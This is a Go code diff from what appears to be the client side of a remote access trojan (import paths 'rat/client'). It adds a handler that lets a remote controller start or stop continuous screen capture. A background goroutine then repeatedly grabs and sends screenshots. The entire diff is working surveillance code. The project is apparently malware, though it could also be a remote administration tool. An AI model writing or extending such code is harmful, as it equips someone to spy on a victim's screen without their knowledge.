@@ -5,14 +5,31 @@ import (
 	"image/jpeg"
 	"rat/client/screen"
 	"rat/common"
+	"time"
 )
 
+var screenStream bool
+
 type ScreenPacket struct {
+	IncomingPacket
 	OutgoingPacket
 }
 
 func (packet ScreenPacket) GetHeader() common.PacketHeader {
 	return common.ScreenHeader
+}
+
+func (packet ScreenPacket) Read(c *Connection) error {
+	run, err := c.ReadBool()
+
+	if run {
+		screenStream = true
+		go ScreenStream()
+	} else {
+		screenStream = false
+	}
+
+	return err
 }
 
 func (packet ScreenPacket) Write(c *Connection) error {
@@ -28,4 +45,12 @@ func (packet ScreenPacket) Write(c *Connection) error {
 	c.Write(w.Bytes())
 
 	return nil
+}
+
+// ScreenStream goroutine
+func ScreenStream() {
+	for screenStream {
+		Queue <- ScreenPacket{}
+		time.Sleep(common.ScreenStreamWait)
+	}
 }
